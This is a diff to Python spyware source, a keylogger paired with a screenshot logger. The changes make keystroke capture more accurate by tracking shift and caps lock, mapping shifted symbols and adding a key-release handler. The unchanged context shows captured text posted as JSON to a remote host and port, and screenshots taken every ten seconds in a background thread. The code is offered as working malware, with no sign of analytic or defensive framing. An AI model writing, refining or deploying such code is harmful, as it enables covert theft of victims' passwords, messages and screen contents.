@@ -7,6 +7,7 @@ import string
 import random
 from datetime import datetime
 import os
+from pynput.keyboard import Key, KeyCode
 
 class KeyLogger:
 
@@ -16,7 +17,15 @@ class KeyLogger:
         self.port = port
         self.interval = interval
         self.text = ""
+        self.shift_pressed = False
+        self.capslock_on = False
     
+        self.shift_map = { 
+            '1': '!', '2': '@', '3': '#', '4': '$', '5': '%',
+            '6': '^', '7': '&', '8': '*', '9': '(', '0': ')',
+            '`': '~', '-': '_', '=': '+', '[': '{', ']': '}',
+            '\\': '|', ';': ':', "'": '"', ',': '<', '.': '>', '/': '?' 
+        }
     def _send_post_request(self):
         payload = json.dumps({"keyboardData": self.text})
         try:
@@ -36,7 +45,12 @@ class KeyLogger:
     def _on_press(self, key):
         try:
             print(f"Pressed:{key}")
-            if key == keyboard.Key.enter:
+
+            if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
+                self.shift_pressed = True
+            elif key == keyboard.Key.caps_lock:
+                self.capslock_on = not self.capslock_on
+            elif key == keyboard.Key.enter:
                 self.text += "\n"
             elif key == keyboard.Key.tab:
                 self.text += "\t"
@@ -46,16 +60,33 @@ class KeyLogger:
                 self.text =  self.text [:-1]
             elif key == keyboard.Key.esc:
                 print ("ESC pressed. Stopping Listener")
+                os._exit(0)
                 return False # stops listener
-            
-            else:
-                self.text += str(key).strip("'")
-        except:
-            pass
+            elif isinstance(key, keyboard.KeyCode):
+                char = key.char
+                if char is not None:
+    
+                    if self.shift_pressed and char in self.shift_map:
+                        self.text += self.shift_map[char]
+                    elif self.shift_pressed:
+                        self.text += char.upper()
+                    elif self.capslock_on and char.isalpha():
+                        self.text += char.upper()
+                    else:
+                        self.text += char
+
+        except Exception as e:
+            print(f"[ERROR] {e}")
+
+    def _on_release(self, key):
+        if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
+            self.shift_pressed = False
 
     def start(self):
         self._send_post_request()
-        with keyboard.Listener(on_press=self._on_press) as listener:
+        with keyboard.Listener(on_press=self._on_press,
+                               on_release=self._on_release
+        ) as listener:
             listener.join()
 
 class ScreenshotLogger:
@@ -113,7 +144,7 @@ class ScreenshotLogger:
 
         loop()
 
-screenshot_logger = ScreenshotLogger(interval= 10)
+screenshot_logger = ScreenshotLogger(interval = 10)
 screenshot_thread = threading.Thread(target = screenshot_logger.start)
 screenshot_thread.daemon = True
 screenshot_thread.start()
